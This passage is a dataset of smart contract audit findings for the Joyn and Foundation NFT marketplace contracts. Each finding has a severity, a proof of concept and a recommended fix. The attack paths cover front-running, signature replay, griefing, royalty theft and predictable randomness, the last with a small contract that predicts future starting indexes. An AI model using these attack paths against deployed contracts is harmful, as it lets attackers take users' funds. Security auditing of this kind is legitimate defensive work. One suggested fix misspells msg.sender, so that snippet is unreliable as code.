Consider implementing the necessary functionality to allow for the collection of fees through an on-chain mechanism. `ERC2981` outlines the appropriate behaviour for this.





***"
104.md,createProject can be frontrun,medium,"This is dangerous in scam senario because the malicious user can frontrun and become the owner of the collection. As owner, one can withdraw `paymentToken`. (note that \_collections.isForSale can be change by frontrunner)

### Proof of Concept

1.  Anyone can call `createProject`.

<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L70-L77>

```solidity
  function createProject(
    string memory _projectId,
    Collection[] memory _collections
  ) external onlyAvailableProject(_projectId) {
    require(
      _collections.length > 0,
      'CoreFactory: should have more at least one collection'
    );
```

### Recommended Mitigation Steps

Two ways to mitigate.

1.  Consider use white list on project creation.
2.  Ask user to sign their address and check the signature against `msg.sender`.  <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L102>






***"
104.md,Gas costs will likely result in any fees sent to the Splitter being economically unviable to recover.,medium,"<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L161-L163>

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L307>

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L43-L50>

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L149-L169>

### Impact

Collection owners will likely lose money by claiming fees unless the fees from a single NFT sale outweighs the cost of claiming it (not guaranteed).

### Proof of Concept

Consider a new `Collection` with a `RoyaltyVault` and `Splitter` set and a nonzero mint fee.

When calling `mintToken`, the `_handlePayment` function is called
<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L161-L163>

This will transfer the minting fee to the `RoyaltyVault` contract.

On each transfer of an NFT within the collection (for instance in the `_mint` call which occurs directly after calling `_handlePayment`), the `Collection` contract will call `sendToSplitter` on the `RoyaltyVault`:

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L307>

This function will forward the collection owners' portion of the minting on to the `Splitter` contract but another important thing to note is that we call `Splitter.incrementWindow`.

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L43-L50>

This results in the fees newly deposited into the `Splitter` contract being held in a separate ""window"" to the fees from previous or later mints and need to be claimed separately. Remember that this process happens on every NFT sale so the only funds which will be held in this window will be the minting fees for this particular mint.

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L149-L169>

From this we can see that the `claim` function will only claim the fraction of the fees which are owed to the caller from a single NFT mint.

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L112-L142>

Note that we can attempt to claim from multiple windows in a single transaction using `claimForAllWindow` but as the name suggests it performs an unbounded loop trying to claim all previous windows (even ones which have already been claimed!) and it is likely that with a new window for every NFT sold this function will exceed the gas limit (consider an 10k token collection resulting in trying to do 10k SSTOREs at 20k gas each.), leaving us to claim each window individually with `claim`.

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L35-L62>

We're then forced to claim the royalties from each NFT sold one by one, having to send huge numbers of calls to `claim` incurring the base transaction cost many times over and performing many ERC20 transfers when we could have just performed one.

Compound on this that this needs to be repeated by everyone included in the split, multiplying the costs of claiming.

Medium risk as it's gas inefficiency to the point of significant value leakage where collection owners will lose a large fraction of their royalties.

### Recommended Mitigation Steps

It doesn't seem like the ""window"" mechanism does anything except raise gas costs to the extent that it will be very difficult to withdraw fees so it should be removed.





***"
104.md,CoreCollection's token transfer can be disabled,medium,"<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L51-L57>

<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L164>

### Impact

When royaltyAsset is an ERC20 that doesn't allow zero amount transfers, the following griefing attack is possible, entirely disabling CoreCollection token transfer by precision degradation as both reward distribution and vault balance can be manipulated.

Suppose splitterProxy is set, all addresses and fees are configured correctly, system is in normal operating state.

POC:

Bob the attacker setup a bot which every time it observes positive royaltyVault balance:

1.  runs `sendToSplitter()`, distributing the whole current royaltyAsset balance of the vault to splitter and platform, so vault balance becomes zero

2.  sends `1 wei` of royaltyAsset to the royaltyVault balance

3.  each next CoreCollection token transfer will calculate `platformShare = (balanceOfVault * platformFee) / 10000`, which will be 0 as platformFee is supposed to be less than 100%, and then there will be an attempt to transfer it to `platformFeeRecipient`

If royaltyAsset reverts on zero amount transfers, the whole operation will fail as the success of `IERC20(royaltyAsset).transfer(platformFeeRecipient, platformShare)` is required for each CoreCollection token transfer, which invokes `sendToSplitter()` in `_beforeTokenTransfer()` as vault balance is positive in (3).

Notice, that Bob needn't to front run the transfer, it is enough to empty the balance in a lazy way, so cumulative gas cost of the attack can be kept moderate.

Setting severity to medium as on one hand, the attack is easy to setup and completely blocks token transfers, making the system inoperable, and it looks like system has to be redeployed on such type of attack with some manual management of user funds, which means additional operational costs and reputational damage. On the another, it is limited to the zero amount reverting royaltyAsset case or the case when platformFee is set to 100%.

That is, as an another corner case, if platformFee is set to 100%, `platformShare` will be `1 wei` and `splitterShare` be zero in (3), so this attack be valid for any royaltyAsset as it is required in Splitter's `incrementWindow` that `splitterShare` be positive.

### Proof of Concept

As royaltyAsset can be an arbitrary ERC20 it can be reverting on zero value transfers:

<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>

`_beforeTokenTransfer` runs `IRoyaltyVault(royaltyVault).sendToSplitter()` whenever royaltyVault is set and have positive balance:

<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L307>

`sendToSplitter()` leaves vault balance as exactly zero as `splitterShare = balanceOfVault - platformShare`, i.e. no dust is left behind:

<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L41>

This way the balance opens up for the tiny amount manipulation.

One require that can fail the whole operation is `platformShare` transfer:

<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L51-L57>

Another is positive `royaltyAmount` = `splitterShare` requirement:

<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L164>

### Recommended Mitigation Steps

The issue is that token transfer, which is core system operation, require fee splitting to be done on the spot. More failsafe design is to try to send the fees and record the amounts not yet distributed, not requiring immediate success. The logic here is that transfer itself is more important than fee distribution, which is simple enough and can be performed in a variety of ways later.

Another issue is a combination of direct balance usage and the lack of access controls of the sendToSplitter function, but it only affects fee splitting and is somewhat harder to address.

As one approach consider trying, but not requiring `IRoyaltyVault(royaltyVault).sendToSplitter()` to run successfully as it can be executed later with the same result.

Another, a simpler one (the same is in `Griefing attack is possible making Splitter's claimForAllWindows inaccessible` issue), is to introduce action threshold, `MIN_ROYALTY_AMOUNT`, to `sendToSplitter()`, for example:

Now:

    /**
     * @dev Send accumulated royalty to splitter.
     */
    function sendToSplitter() external override {
        uint256 balanceOfVault = getVaultBalance();

        require(
            balanceOfVault > 0,
            ""Vault does not have enough royalty Asset to send""
        );
    	...

        emit RoyaltySentToSplitter(...);
        emit FeeSentToPlatform(...);
    }

To be:

    /**
     * @dev Send accumulated royalty to splitter if it's above MIN_ROYALTY_AMOUNT threshold.
     */
    function sendToSplitter() external override {
        uint256 balanceOfVault = getVaultBalance();

        if (balanceOfVault > MIN_ROYALTY_AMOUNT) {
    		...

    	    emit RoyaltySentToSplitter(...);
    	    emit FeeSentToPlatform(...);
        }
    }

 


***"
104.md,Ineffective Handling of FoT or Rebasing Tokens,medium,"Certain ERC20 tokens may change user's balances over time (positively or negatively) or charge a fee when a transfer is called (FoT tokens). The accounting of these tokens is not handled by `RoyaltyVault.sol` or `Splitter.sol` and may result in tokens being stuck in `Splitter` or overstating the balance of a user

Thus, for FoT tokens if all users tried to claim from the Splitter there would be insufficient funds and the last user could not withdraw their tokens.

### Proof of Concept

The function `RoyaltyVault.sendToSplitter()` will transfer `splitterShare` tokens to the `Splitter` and then call `incrementWindow(splitterShare)` which tells the contract to split `splitterShare` between each of the users.

            require(
                IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,
                ""Failed to transfer royalty Asset to splitter""
            );
            require(
                ISplitter(splitterProxy).incrementWindow(splitterShare) == true,
                ""Failed to increment splitter window""
            );

Since the `Splitter` may receive less than `splitterShare` tokens if there is a fee on transfer the `Splitter` will overstate the amount split and each user can claim more than their value (except the last user who claims nothing as the contract will have insufficient funds to transfer them the full amount).

Furthermore, if the token rebase their value of the tokens down while they are sitting in the `Splitter` the same issue will occur. If the tokens rebase their value up then this will not be accounted for in the protocol.

### Recommended Mitigation Steps

It is recommend documenting clearly that rebasing token should not be used in the protocol.

Alternatively, if it is a requirement to handle rebasing tokens balance checks should be done before and after the transfer to ensure accurate accounting. Note: this makes the contract vulnerable to reentrancy and so a [reentrancy guard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) must be placed over the function `sendToSplitter()`.

            uint256 balanceBefore = IERC20(royaltyAsset).balanceOf(splitterProxy);
            require(
                IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,
                ""Failed to transfer royalty Asset to splitter""
            );
            uint256 balanceAfter = IERC20(royaltyAsset).balanceOf(splitterProxy);
            require(
                ISplitter(splitterProxy).incrementWindow(balanceAfter - balanceBefore) == true,
                ""Failed to increment splitter window""
            );





***"
104.md,"CoreCollection: Starting index is pseudo-randomly generated, allowing for gameable NFT launches",medium,"In Paradigm’s article *[“A Guide to Designing Effective NFT Launches”](https://www.paradigm.xyz/2021/10/a-guide-to-designing-effective-nft-launches),* one of the desirable properties of an NFT launch is **unexploitable fairness:** Launches *must* have true randomness to ensure that predatory users cannot snipe the rarest items at the expense of less sophisticated users.

It is therefore highly recommended to find a good source of entropy for the generation of the starting index. The `block.number` isn’t random at all; it only incrementally increases, allowing anyone to easily compute the starting indexes of the next 10,000 blocks for instance.

```jsx
contract FortuneTeller {
  function predictStartingIndexes(uint256 maxSupply, uint256 numBlocks) 
    external
    view
    returns 
    (uint256[] memory startingIndexes) {
    startingIndexes = new uint[](numBlocks);
    for (uint256 i = 0; i < numBlocks; ++i) {
        startingIndexes[i] = (uint256(
            keccak256(abi.encodePacked(""CoreCollection"", block.number + i))
        ) % maxSupply) +
        1;
    }
  }
}
```

Coupled with the fact that the `_baseUri` is set upon initialization, the metadata could be scrapped beforehand to determine the rare NFTs.

Thus, NFT mints can be gamed / exploited.

### Recommended Mitigation Steps

Consider exploring the use of commit-reveal schemes (eg. blockhash of a future block, less gameable but not foolproof) or VRFs.





***"
104.md,Differing percentage denominators causes confusion and potentially brick claims,medium,"<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L14>

<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L103>

### Details & Impact

There is a `PERCENTAGE_SCALE = 10e5` defined, but the actual denominator used is `10000`. This is aggravated by the following factors:

1.  Split contracts are created by collection owners, not the factory owner. Hence, there is a likelihood for someone to mistakenly use `PERCENTAGE_SCALE` instead of `10000`.
2.  The merkle root for split distribution can only be set once, and a collection’s split and royalty vault can’t be changed once created.

Thus, if an incorrect denominator is used, the calculated claimable amount could exceed the actual available funds in the contract, causing claims to fail and funds to be permanently locked.

### Recommended Mitigation Steps

Remove `PERCENTAGE_SCALE` because it is unused, or replace its value with `10_000` and use that instead.

P.S: there is an issue with the example scaled percentage given for platform fees `(5% = 200)`. Should be `500` instead of `200`.




***"
104.md,Add a timelock to `setPlatformFee()`,medium,"<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L120>

<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L67>

### Impact

It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate.

Here, no timelock capabilities seem to be used

I believe this impacts multiple users enough to make them want to react / be notified ahead of time.

### Recommended Mitigation Steps

Consider adding a timelock to `setPlatformFee()`




***"
104.md,Not handling return value of transferFrom command can create inconsistency,medium,"<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L175-L176>

<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Payable.sol#L54-L55>

### Vulnerability details

The below transferFrom command is called at two places in the core contracts, followed by an emit event

    payableToken.transferFrom(msg.sender,recipient,_amount)
    emit ...(...);

The return value is not checked during the payableToken.transferFrom

### Impact

In the event of failure of payableToken.transferFrom(...), the emit event is still generated causing the downstream applications to capture
wrong transaction / state of the protocol.

### Proof of Concept

1.  Contract CoreCollection.sol\
    function withdraw()

2.  Contract ERC721Payable.sol
    function \_handlePayment

### Recommended Mitigation Steps

Add a require statement as being used in the RoyaltyVault.sol

    require( payableToken.transferFrom(msg.sender,recipient,_amount) == true,
                ""Failed to transfer amount to recipient"" );






***"
104.md,"`CoreCollection.setRoyaltyVault` doesn't check `royaltyVault.royaltyAsset` against `payableToken`, resulting in potential permanent lock of `payableTokens` in royaltyVault",medium,"<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L185>

<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/ERC721Payable.sol#L50>

<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L31>

### Impact

Each CoreProxy is allowed to be associated with a RoyaltyVault, the latter which would be responsible for collecting minting fees and distributing to beneficiaries. Potential mismatch between token used in CoreProxy and RoyaltyVault might result in minting tokens being permanently stuck in RoyaltyVault.

### Proof of Concept

Each RoyaltyVault can only handle the `royaltyVault.royaltyAsset` token assigned upon creation, if any other kind of tokens are sent to the vault, it would get stuck inside the vault forever.

        function sendToSplitter() external override {
            ...
            require(
                IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,
                ""Failed to transfer royalty Asset to splitter""
            );
            ...
            require(
                IERC20(royaltyAsset).transfer(
                    platformFeeRecipient,
                    platformShare
                ) == true,
                ""Failed to transfer royalty Asset to platform fee recipient""
            );
            ...
        }

Considering that pairing of CoreProxy and RoyaltyVault is not necessarily handled automatically, and can sometimes be manually assigned, and further combined with the fact that once assigned, CoreProxy does not allow modifications of the pairing RoyaltyVault. We can easily conclude that if a CoreProxy is paired with an incompatible RoyaltyVault, the `payableToken` minting fees automatically transferred to RoyaltyVault by `_handlePayment` will get permanently stuck.

         function setRoyaltyVault(address _royaltyVault)
             external
             onlyVaultUninitialized
         {
             ...
             royaltyVault = _royaltyVault;
             ...
         }

         function _handlePayment(uint256 _amount) internal {
             address recipient = royaltyVaultInitialized()
                 ? royaltyVault
                 : address(this);
             payableToken.transferFrom(msg.sender, recipient, _amount);
             ...
         }

### Tools Used

vim, ganache-cli

### Recommended Mitigation Steps

While assigning vaults to CoreProxy, check if `payableToken` is the same as `royaltyVault.royaltyAsset`

         function setRoyaltyVault(address _royaltyVault)
             external
             onlyVaultUninitialized
         {
             require(
                 payableToken == _royaltyVault.royaltyAsset(),
                 ""CoreCollection : payableToken must be same as royaltyAsset.""
             );
             ...
             royaltyVault = _royaltyVault;
             ...
         }

 




***"
94.md,NFT owner can create multiple auctions,high,"[NFTMarketReserveAuction.sol#L325-L349](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketReserveAuction.sol#L325-L349)<br>
[NFTMarketReserveAuction.sol#L596-L599](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketReserveAuction.sol#L596-L599)<br>

NFT owner can permanently lock funds of bidders.

### Proof of Concept

Alice (the attacker) calls `createReserveAuction`, and creates one like normal. let this be auction id 1.

Alice calls `createReserveAuction` again, before any user has placed a bid (this is easy to guarantee with a deployed attacker contract). We'd expect that Alice wouldn't be able to create another auction, but she can, because `_transferToEscrow` doesn't revert if there's an existing auction. let this be Auction id 2.

Since `nftContractToTokenIdToAuctionId[nftContract][tokenId]` will contain auction id 2, all bidders will see that auction as the one to bid on (unless they inspect contract events or data manually).

Alice can now cancel auction id 1, then cancel auction id 2, locking up the funds of the last bidder on auction id 2 forever.

### Recommended Mitigation Steps

Prevent NFT owners from creating multiple auctions.




***"
94.md,Creators can steal sale revenue from owners' sales,high,"[NFTMarketCreators.sol#L158-L160](https://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L158-L160)<br>
[NFTMarketCreators.sol#L196-L198](https://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L196-L198)<br>
[NFTMarketCreators.sol#L97-L99](https://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L97-L99)<br>

According to the [`README.md`](<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/README.md?plain=1#L21>):

> All sales in the Foundation market will pay the creator 10% royalties on secondary sales. This is not specific to NFTs minted on Foundation, it should work for any NFT. If royalty information was not defined when the NFT was originally deployed, it may be added using the Royalty Registry which will be respected by our market contract.

Using the Royalty Registry an owner can decide to change the royalty information right before the sale is complete, affecting who gets what.

### Impact

By updating the registry to include the seller as one of the royalty recipients, the creator can steal the sale price minus fees. This is because if code finds that the seller is a royalty recipient the royalties are all passed to the creator regardless of whether the owner is the seller or not.

### Proof of Concept

```solidity
          // 4th priority: getRoyalties override
          if (recipients.length == 0 && nftContract.supportsERC165Interface(type(IGetRoyalties).interfaceId)) {
            try IGetRoyalties(nftContract).getRoyalties{ gas: READ_ONLY_GAS_LIMIT }(tokenId) returns (
              address payable[] memory _recipients,
              uint256[] memory recipientBasisPoints
            ) {
              if (_recipients.length > 0 && _recipients.length == recipientBasisPoints.length) {
                bool hasRecipient;
                for (uint256 i = 0; i < _recipients.length; ++i) {
                  if (_recipients[i] != address(0)) {
                    hasRecipient = true;
                    if (_recipients[i] == seller) {
                      return (_recipients, recipientBasisPoints, true);
```

<https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L127-L154>

When `true` is returned as the final return value above, the following code leaves `ownerRev` as zero because `isCreator` is `true`.

```solidity
      uint256 ownerRev
    )
  {
    bool isCreator;
    (creatorRecipients, creatorShares, isCreator) = _getCreatorPaymentInfo(nftContract, tokenId, seller);

    // Calculate the Foundation fee
    uint256 fee;
    if (isCreator && !_nftContractToTokenIdToFirstSaleCompleted[nftContract][tokenId]) {
      fee = PRIMARY_FOUNDATION_FEE_BASIS_POINTS;
    } else {
      fee = SECONDARY_FOUNDATION_FEE_BASIS_POINTS;
    }

    foundationFee = (price * fee) / BASIS_POINTS;

    if (creatorRecipients.length > 0) {
      if (isCreator) {
        // When sold by the creator, all revenue is split if applicable.
        creatorRev = price - foundationFee;
      } else {
        // Rounding favors the owner first, then creator, and foundation last.
        creatorRev = (price * CREATOR_ROYALTY_BASIS_POINTS) / BASIS_POINTS;
        ownerRevTo = seller;
        ownerRev = price - foundationFee - creatorRev;
      }
    } else {
      // No royalty recipients found.
      ownerRevTo = seller;
      ownerRev = price - foundationFee;
    }
  }
```

In addition, if the index of the seller in `_recipients` is greater than `MAX_ROYALTY_RECIPIENTS_INDEX`, then the seller is omitted from the calculation and gets zero (`_sendValueWithFallbackWithdraw()` doesn't complain when it sends zero).

```solidity
        uint256 maxCreatorIndex = creatorRecipients.length - 1;
        if (maxCreatorIndex > MAX_ROYALTY_RECIPIENTS_INDEX) {
          maxCreatorIndex = MAX_ROYALTY_RECIPIENTS_INDEX;
        }
```

<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L76-L79>

This issue does a lot of damage because the creator can choose whether and when to apply it on a sale-by-sale basis. Two other similar, but separate, exploits are available for the other blocks in `_getCreatorPaymentInfo()` that return arrays but they either require a malicious NFT implementation or can only specify a static seller for which this will affect things. In all cases, not only may the seller get zero dollars for the sale, but they'll potentially owe a lot of taxes based on the 'sale' price. The attacker may or may not be the creator - creators can be bribed with kickbacks.

### Recommended Mitigation Steps

Always calculate owner/seller revenue separately from royalty revenue.




***"
94.md,An offer made after auction end can be stolen by an auction winner,high,"An Offer which is made for an NFT when auction has ended, but its winner hasn't received the NFT yet, can be stolen by this winner as `_transferFromEscrow` being called by `_acceptOffer` will transfer the NFT to the winner, finalising the auction, while no transfer to the user who made the offer will happen.

This way the auction winner will obtain both the NFT and the offer amount after the fees at no additional cost, at the expense of the user who made the offer.

### Proof of Concept

When an auction has ended, there is a possibility to make the offers for an auctioned NFT as:

`makeOffer` checks `_isInActiveAuction`:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L200>

`_isInActiveAuction` returns false when `auctionIdToAuction[auctionId].endTime < block.timestamp`, so `makeOffer` above can proceed:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L666-L669>

Then, the auction winner can call `acceptOffer -> _acceptOffer` (or `setBuyPrice -> _autoAcceptOffer -> _acceptOffer`).

`_acceptOffer` will try to transfer directly, and then calls `_transferFromEscrow`:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L262-L271>

If the auction has ended, but a winner hasn't picked up the NFT yet, the direct transfer will fail, proceeding with `_transferFromEscrow` in the FNDNFTMarket defined order:

    function _transferFromEscrow(
    address nftContract,
    uint256 tokenId,
    address recipient,
    address seller
    ) internal override(NFTMarketCore, NFTMarketReserveAuction, NFTMarketBuyPrice, NFTMarketOffer) {
    super._transferFromEscrow(nftContract, tokenId, recipient, seller);
    }

NFTMarketOffer.\_transferFromEscrow will call super as `nftContractToIdToOffer` was already deleted:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L296-L302>

NFTMarketBuyPrice.\_transferFromEscrow will call super as there is no buy price set:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L283-L293>

Finally, NFTMarketReserveAuction.\_transferFromEscrow will send the NFT to the winner via `_finalizeReserveAuction`, not to the user who made the offer:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L556-L560>

The `recipient` user who made the offer is not present in this logic, the NFT is being transferred to the `auction.bidder`, and the original `acceptOffer` will go through successfully.

### Recommended Mitigation Steps

An attempt to set a buy price from auction winner will lead to auction finalisation, so `_buy` cannot be called with a not yet finalised auction, this way the NFTMarketReserveAuction.\_transferFromEscrow L550-L560 logic is called from the NFTMarketOffer.\_acceptOffer only:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L270>

is the only user of

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L550-L560>

This way the fix is to update L556-L560 for the described case as:

Now:

    // Finalization will revert if the auction has not yet ended.
    _finalizeReserveAuction(auctionId, false);

    // Finalize includes the transfer, so we are done here.
    return;

To be, we leave the NFT in the escrow and let L564 super call to transfer it to the recipient:

    // Finalization will revert if the auction has not yet ended.
    _finalizeReserveAuction(auctionId, true);




***"
94.md,EIP-712 signatures can be re-used in private sales,medium,"[NFTMarketPrivateSale.sol#L123-L174](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L123-L174)<br>

Within a NFTMarketPrivateSale contract, buyers are allowed to purchase a seller's NFT. This is done through a seller providing a buyer a EIP-712 signature. The buyer can then call `#buyFromPrivateSaleFor` providing the v, r, and s values of the signature as well as any additional details to generate the message hash. If the signature is valid, then the NFT is transferred to the buyer.

The problem with the code is that EIP-712 signatures can be re-used within a small range of time assuming that the original seller takes back ownership of the NFT. This is because the NFTMarketPrivateSale#buyFromPrivateSaleFor method has no checks to determine if the EIP-712 signature has been used before.

### Proof of Concept

Consider the following example:

1.  Joe the NFT owner sells a NFT to the malicious buyer Rachel via a private sale.
2.  Rachel through this private sale obtains the EIP-712 signature and uses it to purchase a NFT.
3.  Joe the NFT owner purchases back the NFT within two days of the original sale to Rachel.
4.  Joe the NFT owner puts the NFT back on sale.
5.  Rachel, who has the original EIP-712 signature, can re-purchase the NFT by calling `#buyFromPrivateSaleFor` again with the same parameters they provided in the original private sale purchase in step 1.

The `#buyFromPrivateSaleFor` [function](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L123) runs several validation checks before transferring the NFT over to the buyer. The validations are as follows:

1.  L#132 - The signature has expired.
2.  L#135 - The deadline is beyond 48 hours from now.
3.  L#143 - The amount argument is greater than msg.value.
4.  L#149 - The msg.value is greater than the amount set.
5.  L#171 - This checks that the EIP-712 signature comes from the NFT seller.

As you can see, there are no checks that the EIP-712 signature has been used before. If the original NFT seller purchases back the NFT, then they are susceptible to having the original buyer taking back the NFT. This can be problematic if the NFT has risen in value, as the original buyer can utilize the same purchase amount from the first transaction in this malicious transaction.

### Recommended Mitigation Steps

Most contracts utilize nonces when generating EIP-712 signatures to ensure that the contract hasn't been used for. When a nonce is injected into a signature, it makes it impossible for re-use, assuming of course the nonce feature is done correctly.




***"
94.md,`SendValueWithFallbackWithdraw`: `withdrawFor` function may fail to withdraw ether recorded in `pendingWithdrawals`,medium,"The NFTMarketFees contract and the NFTMarketReserveAuction contract use the \_sendValueWithFallbackWithdraw function to send ether to FoundationTreasury, CreatorRecipients, Seller, Bidder.
When the receiver fails to receive due to some reasons (exceeding the gas limit or the receiver contract cannot receive ether), it will record the ether to be sent in the pendingWithdrawals variable.

      function _sendValueWithFallbackWithdraw(
        address payable user,
        uint256 amount,
        uint256 gasLimit
      ) internal {
        if (amount == 0) {
          return;
        }
        // Cap the gas to prevent consuming all available gas to block a tx from completing successfully
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = user.call{ value: amount, gas: gasLimit }("""");
        if (!success) {
          // Record failed sends for a withdrawal later
          // Transfers could fail if sent to a multisig with non-trivial receiver logic
          unchecked {
            pendingWithdrawals[user] += amount;
          }
          emit WithdrawPending(user, amount);
        }
      }

The user can then withdraw ether via the withdraw or withdrawFor functions.

      function withdraw() external {
        withdrawFor(payable(msg.sender));
      }
      function withdrawFor(address payable user) public nonReentrant {
        uint256 amount = pendingWithdrawals[user];
        if (amount == 0) {
          revert SendValueWithFallbackWithdraw_No_Funds_Available();
        }
        pendingWithdrawals[user] = 0;
        user.sendValue(amount);
        emit Withdrawal(user, amount);
      }

However, the withdrawFor function can only send ether to the address recorded in pendingWithdrawals. When the recipient is a contract that cannot receive ether, these ethers will be locked in the contract and cannot be withdrawn.

### Proof of Concept

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/SendValueWithFallbackWithdraw.sol#L37-L77>

### Recommended Mitigation Steps

Add the withdrawTo function as follows:

      function withdrawTo(address payable to) public nonReentrant {
        uint256 amount = pendingWithdrawals[msg.sneder];
        if (amount == 0) {
          revert SendValueWithFallbackWithdraw_No_Funds_Available();
        }
        pendingWithdrawals[msg.sneder] = 0;
        to.sendValue(amount);
        emit Withdrawal(msg.sneder, amount);
      }





***"
94.md,Approve race condition in FETH,medium,"[FETH.sol#L212](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/FETH.sol#L212)<br>

Front running attack in approve.

### Proof of Concept

The contract of the `FETH` does not have any protection against the well-known “Multiple Withdrawal Attack” attack on the Approve/TransferFrom methods of the ERC20 standard.

Although this attack poses a limited risk in specific situations, it is worth mentioning to consider it for possible future operations.

There are solutions to mitigate this front running such as, to first reduce the spender's allowance to 0 and set the desired value afterwards; another solution could the one that Open Zeppelin offers, where the non-standard decreaseAllowance and increaseAllowance functions have been added to mitigate the well-known issues involving setting allowances.

### Recommended Mitigation Steps

Add increase and decrease allowance.




***"
94.md,`adminAccountMigration()` Does Not Update `buyPrice.seller`,medium,"[NFTMarketReserveAuction.sol#L263-L292](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L263-L292)<br>
[NFTMarketBuyPrice.sol#L125-L141](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L125-L141)<br>

